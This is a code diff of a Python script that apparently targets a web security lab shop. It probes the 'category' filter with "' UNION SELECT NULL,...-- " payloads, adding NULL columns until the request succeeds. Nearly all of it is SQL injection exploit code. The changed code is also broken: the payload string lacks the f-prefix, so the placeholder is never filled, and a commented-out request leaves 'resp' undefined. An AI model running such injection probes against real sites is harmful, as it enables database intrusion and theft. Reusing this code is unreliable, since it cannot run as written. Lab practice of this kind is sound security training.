@@ -20,14 +20,18 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 def main(args):
-    shop = Shop()
-    count = 1;
-    for i in range(1,51):
+    shop = Shop(args.url, args.no_proxy, )
+    nulls_list = ["NULL"]
+    for i in range(2,51):
+        nulls = ",".join(nulls_list)
         filter_path = "filter?category=' UNION SELECT {nulls}-- "
-        response = requests.get(shop.base_url + filter_path)
-        if response.status_code == 200:
+        exploit_url = shop.base_url + filter_path
+        print(exploit_url)
+        #resp = requests.get(shop.base_url + filter_path)
+        if resp.status_code == 200:
             break
-            shop.is_solved()
+        nulls_list.append("NULL")        
+    shop.is_solved()
     
 if __name__ == "__main__":
     args=utils.parse_args(sys.argv)
